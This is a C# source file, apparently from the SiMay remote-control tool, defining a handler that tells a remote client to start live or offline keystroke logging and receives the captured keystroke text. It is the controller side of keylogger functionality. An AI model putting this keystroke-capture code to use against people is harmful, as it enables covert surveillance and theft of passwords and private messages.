using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using SiMay.Core;
using SiMay.ModelBinder;
using SiMay.Net.SessionProvider;

namespace SiMay.RemoteControls.Core
{
    [ApplicationServiceKey(ApplicationKeyConstant.REMOTE_KEYBOARD)]
    public class KeyboardAdapterHandler : ApplicationBaseAdapterHandler
    {
        public event Action<KeyboardAdapterHandler, string> OnKeyboardDataEventHandler;

        public event Action<KeyboardAdapterHandler, string> OnOffLineKeyboradEventHandler;

        [PacketHandler(MessageHead.C_KEYBOARD_DATA)]
        private void KeyBoardDataHandler(SessionProviderContext session)
        {
            var text = session.GetMessage().ToUnicodeString();
            this.OnKeyboardDataEventHandler?.Invoke(this, text);
        }

        [PacketHandler(MessageHead.C_KEYBOARD_OFFLINEFILE)]
        private void OffLinesDataHandler(SessionProviderContext session)
        {
            var text = session.GetMessage().ToUnicodeString();
            this.OnOffLineKeyboradEventHandler?.Invoke(this, text);
        }

        public void StartGetKeyorad()
        {
            SendToAsync(MessageHead.S_KEYBOARD_ONOPEN);
        }

        public void StartOffLineKeyboard()
        {
            SendToAsync(MessageHead.S_KEYBOARD_OFFLINE);
        }

        public void GetOffLineKeyboardData()
        {
            SendToAsync(MessageHead.S_KEYBOARD_GET_OFFLINEFILE);
        }
    }
}
